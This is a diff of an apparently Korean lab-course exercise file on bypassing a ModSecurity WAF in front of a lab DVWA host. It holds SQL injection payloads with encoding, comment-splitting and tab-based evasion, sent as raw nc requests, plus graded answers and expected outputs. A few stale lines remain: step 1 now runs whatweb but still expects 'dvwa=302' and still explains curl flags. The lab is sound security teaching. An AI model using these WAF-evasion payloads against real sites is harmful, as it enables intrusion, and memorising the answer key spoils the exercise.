@@ -45,7 +45,7 @@ steps:
 
       ```bash
       # 1) 차단형 dvwa 도달성 — 응답코드(우회 성공/실패를 또렷이 보려면 차단 모드 대상)
-      curl -s -o /dev/null -w 'dvwa=%{http_code}\n' http://dvwa.el34.lab/
+      whatweb -a1 http://dvwa.el34.lab/
       ```
       > 💡 브라우저 주소창에 `http://dvwa.el34.lab/` 를 열면 화면(또는 로그인 리다이렉트)이 뜬다 — 여기선
       > 도달성만 보므로 코드만 필요해 `-o /dev/null -w`(본문 버리고 코드만).
@@ -59,7 +59,7 @@ steps:
     points: 10
     answer: |
       # 1) 차단형 dvwa 도달성 — 응답코드(우회 성공/실패를 또렷이 보려면 차단 모드 대상)
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'dvwa=%{http_code}\n' http://dvwa.el34.lab/"
+      ssh att@192.168.0.202 'whatweb -a1 http://dvwa.el34.lab/'
     answer_detail: "필터 우회 대상 = dvwa(차단 모드, ModSec CRS). 응답 코드가 출력되면 대상 도달로 판정 — 차단형 vhost 라야 평문 403 대비 우회의 성공/실패를 또렷이 측정할 수 있다."
     expected_output: |
       dvwa=302
@@ -70,7 +70,7 @@ steps:
       semantic:
         intent: "대상 점검"
         success_criteria: ["도달"]
-        acceptable_methods: ["**[OSS] curl (권장)**"]
+        acceptable_methods: ["**[OSS] nc raw HTTP / whatweb (권장)**"]
     target_vm: web
 
   - order: 2
@@ -89,7 +89,7 @@ steps:
 
       ```bash
       # 1) baseline — 평문 UNION SELECT SQLi(변형 없음) → 차단형 dvwa 응답코드
-      curl -s -o /dev/null -w 'plain=%{http_code}\n' "http://dvwa.el34.lab/?id=1%27%20UNION%20SELECT%201--"
+      echo "plain=$(echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
       ```
       plain=403 이면 평문 UNION SQLi 가 CRS 942→949110 으로 차단된 것 = 이 403 이 우회 평가의 기준선(baseline)이다.
       > 💡 **화면으로 확인:** GET 요청이라 브라우저 주소창에 `http://dvwa.el34.lab/?id=1' UNION SELECT 1--` 를
@@ -104,7 +104,7 @@ steps:
     points: 12
     answer: |
       # 1) baseline — 평문 UNION SELECT SQLi(변형 없음) → 차단형 dvwa 응답코드
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'plain=%{http_code}\n' \"http://dvwa.el34.lab/?id=1%27%20UNION%20SELECT%201--\""
+      echo "plain=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UNION%20SELECT%201-- HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
     answer_detail: "baseline = 평문 SQLi → 403. 변형 없는 UNION SELECT 가 CRS 942 룰군에 곧장 잡혀 anomaly score 누적 → 949110 차단(403). 이후 우회 기법이 이 차단을 200 으로 통과시키는지가 본 주차의 관건."
     expected_output: |
       plain=403
@@ -134,14 +134,14 @@ steps:
 
       ```bash
       # 1) 이중 인코딩 — %2527(%를 %25로 한번 더)→디코드 시 %27→'
-      curl -s -o /dev/null -w 'dbl=%{http_code}\n' 'http://dvwa.el34.lab/?id=1%2527%20UNION%20SELECT'
+      echo "dbl=$(echo -en 'GET /?id=1%2527%20UNION%20SELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
       # 2) 부분 URL 인코딩 — %55=U,%53=S → 디코드 시 UNION SELECT
-      curl -s -o /dev/null -w 'mix=%{http_code}\n' 'http://dvwa.el34.lab/?id=1%27%20%55NION%20%53ELECT'
+      echo "mix=$(echo -en 'GET /?id=1%27%20%55NION%20%53ELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')"
       ```
       dbl·mix 이 대부분 여전히 403 이면 인코딩 우회가 실패한 것 — CRS 가 `t:urlDecodeUni` 로 먼저 디코드한
       뒤 검사해 원형 UNION SELECT 로 되돌리기 때문이다("디코드 전 검사" 가정이 깨짐).
       > 💡 **Burp Repeater 로도 동일:** `?id=` 값만 `%2527`·`%55NION` 등으로 바꿔 Send 하면 응답 코드가 바로
-      > 보인다 — 인코딩을 한 글자씩 바꿔 되쏘는 우회 탐색엔 Burp Repeater 가 curl 반복보다 빠르다.
+      > 보인다 — 인코딩을 한 글자씩 바꿔 되쏘는 우회 탐색엔 Burp Repeater 가 nc 단발 반복보다 빠르다.
       - `%2527`=이중 인코딩(`%`를 `%25`로 한 번 더 → `%2527`→`%27`→`'`), `%55`=`U`/`%53`=`S`(부분 URL 인코딩 → UNION SELECT).
 
       ## ✅ 합격 기준
@@ -152,9 +152,9 @@ steps:
     points: 12
     answer: |
       # 1) 이중 인코딩 — %2527(%를 %25로 한번 더)→디코드 시 %27→'
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'dbl=%{http_code}\n' 'http://dvwa.el34.lab/?id=1%2527%20UNION%20SELECT'"
+      echo "dbl=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%2527%20UNION%20SELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
       # 2) 부분 URL 인코딩 — %55=U,%53=S → 디코드 시 UNION SELECT
-      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'mix=%{http_code}\n' 'http://dvwa.el34.lab/?id=1%27%20%55NION%20%53ELECT'"
+      echo "mix=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20%55NION%20%53ELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")"
     answer_detail: "인코딩 우회 = 같은 문자를 다른 표기로 적기(%55=U, %2527=이중인코딩→'). 노림수는 'WAF 가 디코드 전에 검사한다'는 가정이지만, CRS 는 t:urlDecodeUni transformation 으로 먼저 디코드한 뒤 검사하므로 원형 UNION SELECT 로 되돌아가 942 에 잡힘 → 우회 실패(대부분 403)."
     expected_output: |
       dbl=403
@@ -186,10 +186,10 @@ steps:
 
       ```bash
       # 1) 주석 분할 — UN/**/ION SE/**/LECT(SQL 빈 주석으로 키워드 쪼갬, DB는 UNION으로 실행)
-      C=$(curl -s -o /dev/null -w '%{http_code}' 'http://dvwa.el34.lab/?id=1%27%20UN/**/ION%20SE/**/LECT')
+      C=$(echo -en 'GET /?id=1%27%20UN/**/ION%20SE/**/LECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
       echo "cmt=$C"
       # 2) 탭 공백 — %09(공백 대신 탭으로 토큰 구분, DB는 탭도 구분자로 받음)
-      T=$(curl -s -o /dev/null -w '%{http_code}' 'http://dvwa.el34.lab/?id=1%27%09UNION%09SELECT')
+      T=$(echo -en 'GET /?id=1%27%09UNION%09SELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}')
       echo "tab=$T"
       # 3) 판정 — 주석분할이 차단(403)도 무응답(000)도 아니면 우회 성공
       if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석분할 우회 성공(cmt=$C): libinjection이 주석분할을 못 복원"; else echo "→ 주석분할 차단/무응답(cmt=$C)"; fi
@@ -208,10 +208,10 @@ steps:
     points: 12
     answer: |
       # 1) 주석 분할 — UN/**/ION SE/**/LECT(SQL 빈 주석으로 키워드 쪼갬, DB는 UNION으로 실행)
-      C=$(ssh att@192.168.0.202 "curl -s -o /dev/null -w '%{http_code}' 'http://dvwa.el34.lab/?id=1%27%20UN/**/ION%20SE/**/LECT'")
+      C=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%20UN/**/ION%20SE/**/LECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")
       echo "cmt=$C"
       # 2) 탭 공백 — %09(공백 대신 탭으로 토큰 구분, DB는 탭도 구분자로 받음)
-      T=$(ssh att@192.168.0.202 "curl -s -o /dev/null -w '%{http_code}' 'http://dvwa.el34.lab/?id=1%27%09UNION%09SELECT'")
+      T=$(ssh att@192.168.0.202 "echo -en 'GET /?id=1%27%09UNION%09SELECT HTTP/1.0\r\nHost: dvwa.el34.lab\r\nConnection: close\r\n\r\n' | nc -w3 192.168.0.161 80 | head -1 | grep -oE '[0-9]{3}'")
       echo "tab=$T"
       # 3) 판정 — 주석분할이 차단(403)도 무응답(000)도 아니면 우회 성공
       if [ "$C" != "403" ] && [ "$C" != "000" ]; then echo "→ 주석분할 우회 성공(cmt=$C): libinjection이 주석분할을 못 복원"; else echo "→ 주석분할 차단/무응답(cmt=$C)"; fi
